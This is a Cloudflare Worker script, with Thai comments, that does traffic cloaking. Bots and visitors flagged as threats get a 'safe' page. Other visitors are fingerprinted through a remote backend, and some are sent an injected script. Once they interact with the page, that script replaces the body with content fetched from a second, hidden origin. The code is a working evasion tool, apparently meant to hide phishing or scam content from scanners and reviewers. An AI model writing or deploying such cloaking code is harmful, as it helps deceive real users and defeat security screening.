export interface Env {
  BACKEND_URL: string;
  S_ORIGIN: string;
  M_ORIGIN: string;
}

export default {
  async fetch(request: Request, env: Env) {
    const url = new URL(request.url);

    // WAF Check
    const botScore = request.headers.get("cf-bot-score");
    const threatScore = request.headers.get("cf-threat-score");
    if ((botScore && parseInt(botScore) < 20) || (threatScore && parseInt(threatScore) > 45)) {
      return fetch(env.S_ORIGIN + url.pathname + url.search, request);
    }

    // ส่ง Fingerprint ไป Backend
    const fingerprint = {
      ip: request.headers.get("cf-connecting-ip") || "",
      country: request.headers.get("cf-ipcountry") || "XX",
      userAgent: request.headers.get("user-agent") || "",
      referer: request.headers.get("referer") || "",
      timestamp: Date.now(),
    };

    const decision = await getDecision(fingerprint, env.BACKEND_URL);

    // โหลด Safe Page เป็นหลัก
    let response = await fetch(env.S_ORIGIN + url.pathname + url.search, request);

    // Progressive Injection
    if (decision.mode === "m" && decision.confidence >= 0.75 && decision.allowProgressive) {
      response = await injectProgressive(response, env.M_ORIGIN, decision);
    }

    return response;
  }
};

async function getDecision(fp: any, backendUrl: string) {
  try {
    const res = await fetch(`${backendUrl}/decide`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(fp),
    });
    return res.ok ? await res.json() : { mode: "s", confidence: 0, allowProgressive: false };
  } catch {
    return { mode: "s", confidence: 0, allowProgressive: false };
  }
}

async function injectProgressive(response: Response, mOrigin: string, decision: any) {
  if (!response.headers.get("content-type")?.includes("text/html")) return response;

  const html = await response.text();
  const script = `
<script>
(function() {
  let interacted = false;
  const mark = () => interacted = true;
  document.addEventListener('click', mark, { once: true });
  document.addEventListener('scroll', mark, { once: true });

  setTimeout(() => {
    if (interacted) {
      fetch('${mOrigin}/m-content')
        .then(r => r.text())
        .then(content => {
          document.body.style.transition = 'opacity .4s';
          document.body.style.opacity = '0.2';
          setTimeout(() => {
            document.body.innerHTML = content;
            document.body.style.opacity = '1';
          }, 300);
        });
    }
  }, 2500);
})();
</script>`;

  return new Response(html.replace('</body>', script + '</body>'), {
    headers: response.headers
  });
}